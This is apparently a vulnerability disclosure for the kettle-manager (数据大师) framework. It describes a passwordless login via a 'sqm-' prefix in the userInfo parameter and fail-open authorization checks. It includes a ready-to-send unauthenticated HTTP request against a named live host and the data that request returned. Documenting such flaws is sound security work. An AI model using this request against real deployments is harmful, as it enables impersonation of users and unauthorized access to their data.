# kettle-manager (数据大师) — Passwordless login via `sqm-` prefix + authorization fail-open

## Introduction

The authentication of kettle-manager (数据大师, cn.benma666, closed-source commercial framework) strips a `sqm-` prefix from the `userInfo` parameter and **directly looks up the database**: any match on `yhdm/id/sfzh/sqm/wxyhid` logs the attacker in as that user — no password check, no lockout, no expiry, no IP validation. In addition, `hasAuth` **defaults to allow (fail-open)** for data objects whose `qxm` (permission code) is not registered. An attacker only needs one identifier of any user (employee number / ID card / mobile) or a seed account to obtain that identity and reach unregistered interfaces. [decompiled evidence]

## Affected versions

kettle-manager framework current (closed-source; demo shell open-source)

## Utilize conditions

- `/default` endpoint reachable (any data-object select surface)
- Only `userInfo=sqm-<identifier>` + an arbitrary token needed — no real credentials

---

## Vulnerability Reproduction

**Step 1** — unauthenticated request, `userInfo=sqm-sys` with an **arbitrary token** returns legitimate data:

```http
POST /sjds-ht/default HTTP/1.1
Host: trimdata.cn:2001
Content-Type: application/json
Content-Length: 89

{"sjdx":{"dxdm":"SYS_QX_QTQX"},"sys":{"cllx":"select","userInfo":"sqm-sys","token":"t1"}}
```

Response:

![image-20260824165032402](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260824165032402.2vfhdq9upu.webp)

```json
{"msg":"数据库查询成功","dateType":"application/json","code":200,"data":{"list":[
  {"cjsj":"20200716165940","cjrdwmc":"临时机构","cjrxm":"管理员","px":5,"yxx":"0",
   "gxsj":"20240615231730","id":"C7B00CAE779041FB8263672A2277BF99","kzxx":"{}","yxxMc":"否"},
  {"cjsj":"20240131114916","cjrdwmc":"临时机构","cjrxm":"系统管理员","px":5,"yxx":"1",
   "gxsj":"20240131120851","id":"448942fae6a74dcfade688253ca27d1e","kzxx":"{...}","yxxMc":"是"},
  ...
]}}
```

No real password/session credential is carried, yet the database query succeeds — the `sqm-` passwordless login and the fail-open authorization hold on a live deployment.

code:

![image-20260825083739624](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825083739624.b9n13c11h.webp)

![image-20260825083935460](https://github.com/fangtang7/picx-images-hosting/raw/master/kettle/image-20260825083935460.73uonk2o36.webp)
